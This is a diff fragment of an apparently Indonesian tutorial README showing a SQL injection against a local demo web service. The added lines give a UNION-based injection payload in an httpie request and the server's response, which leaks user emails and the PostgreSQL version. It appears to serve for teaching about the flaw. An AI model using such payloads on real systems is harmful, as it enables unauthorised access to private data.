@@ -61,5 +61,50 @@ Date: Fri, 21 Jun 2019 10:31:22 GMT
 }
 
 ```
+or 
 
+```
+$ http "localhost:8080/user?id=1)) = ((1)) UNION ALL SELECT NULL,version(),current_database(),NULL,NULL,NULL,NULL,NULL--"
+HTTP/1.1 400 Bad Request
+Content-Length: 625
+Content-Type: application/json; charset=utf-8
+Date: Fri, 21 Jun 2019 10:52:23 GMT
+
+{
+    "message": "something error",
+    "result": {
+        "Error": null,
+        "RowsAffected": 3,
+        "Value": [
+            {
+                "address": "Indonesia",
+                "createdAt": "2019-06-21T08:31:52.306189Z",
+                "email": "ari@gmail.com",
+                "id": 2,
+                "role": "ari",
+                "updatedAt": "2019-06-21T08:31:52.306189Z",
+                "username": "ari"
+            },
+            {
+                "address": "Indonesia",
+                "createdAt": "2019-06-21T08:28:15.633152Z",
+                "email": "wahyu@gmail.com",
+                "id": 1,
+                "role": "user",
+                "updatedAt": "2019-06-21T08:28:15.633152Z",
+                "username": "wahyu"
+            },
+            {
+                "address": "",
+                "email": "test",
+                "id": 0,
+                "role": "PostgreSQL 11.2 (Debian 11.2-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit",
+                "username": ""
+            }
+        ]
+    },
+    "status": 400
+}
+
+```
 **Berbagilah Walau hanya Satu Line Of Code**
